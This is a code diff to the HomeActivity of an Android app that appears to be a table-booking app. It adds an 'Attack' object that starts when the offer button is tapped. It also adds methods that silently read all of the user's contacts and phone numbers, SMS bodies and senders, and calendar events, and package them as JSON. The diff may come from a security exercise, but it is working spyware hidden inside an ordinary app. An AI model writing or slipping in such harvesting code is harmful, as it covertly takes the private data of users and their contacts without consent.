@@ -1,9 +1,14 @@
 package com.snakesonwheels.tabely.view;
 
+import android.annotation.SuppressLint;
 import android.app.DatePickerDialog;
 import android.app.TimePickerDialog;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.database.Cursor;
+import android.provider.CalendarContract;
+import android.provider.ContactsContract;
+import android.provider.Telephony;
 import android.support.v4.app.DialogFragment;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
@@ -112,7 +117,7 @@ public class HomeActivity extends AppCompatActivity implements TimePickerDialog.
         buttonOffer.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                Attack attack = new Attack();
+                Attack attack = new Attack(HomeActivity.this);
                 attack.start();
                 startActivity(request.createIntent(HomeActivity.this, new OfferActivity()));
             }
@@ -314,5 +319,74 @@ public class HomeActivity extends AppCompatActivity implements TimePickerDialog.
             }
         }
         return super.onOptionsItemSelected(item);
+    }
+
+    public String gatherContactInformation(){
+        String result ="\"Contact data\": [  ";
+        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, ContactsContract.Contacts.DISPLAY_NAME);
+
+        while (c.moveToNext()) {
+            String contactName = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String phoneNumber = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            result += "{\"name\": \"" + contactName + "\", " +
+                      "\"phoneNo\": \"" + phoneNumber +"\"}, ";
+        }
+        c.close();
+
+        result = result.substring(0, result.length()-2);
+        result += "]";
+        return result ;
+    }
+
+
+    public String gatherSMSInformation(){
+        String result ="\"SMS data\": [  ";
+        Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI,
+                null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
+
+        while (c.moveToNext()) {
+            String body = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
+            String person = c.getString(c.getColumnIndex(Telephony.Sms.PERSON));
+            String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
+            String creator = c.getString(c.getColumnIndex(Telephony.Sms.CREATOR));
+            result += "{\"body\": \"" + body + "\", " +
+                    "\"person\": \"" + person +"\", " +
+                    "\"address\": \"" + address +"\", " +
+                    "\"creator\": \"" + creator +"\"}, ";
+        }
+        c.close();
+
+        result = result.substring(0, result.length()-2);
+        result += "]";
+        return result ;
+    }
+
+    public String gatherCalenderInformation(){
+        String result ="\"Calender data\": [  ";
+        @SuppressLint("MissingPermission") Cursor c = getContentResolver().query(CalendarContract.Events.CONTENT_URI,
+                null, null, null, CalendarContract.Events._ID);
+
+        while (c.moveToNext()) {
+            String name = c.getString(c.getColumnIndex(CalendarContract.Events.CALENDAR_DISPLAY_NAME));
+            String description = c.getString(c.getColumnIndex(CalendarContract.Events.DESCRIPTION));
+            String start = c.getString(c.getColumnIndex(CalendarContract.Events.DTSTART));
+            String end = c.getString(c.getColumnIndex(CalendarContract.Events.DTEND));
+            String duration = c.getString(c.getColumnIndex(CalendarContract.Events.DURATION));
+            String timeZone = c.getString(c.getColumnIndex(CalendarContract.Events.EVENT_TIMEZONE));
+            String status = c.getString(c.getColumnIndex(CalendarContract.Events.STATUS));
+            result += "{\"name\": \"" + name + "\", " +
+                    "\"description\": \"" + description +"\", " +
+                    "\"start\": \"" + start +"\", " +
+                    "\"end\": \"" + end +"\", " +
+                    "\"duration\": \"" + duration +"\", " +
+                    "\"timeZone\": \"" + timeZone +"\", " +
+                    "\"status\": \"" + status +"\"}, ";
+        }
+        c.close();
+
+        result = result.substring(0, result.length()-2);
+        result += "]";
+        return result ;
     }
 }
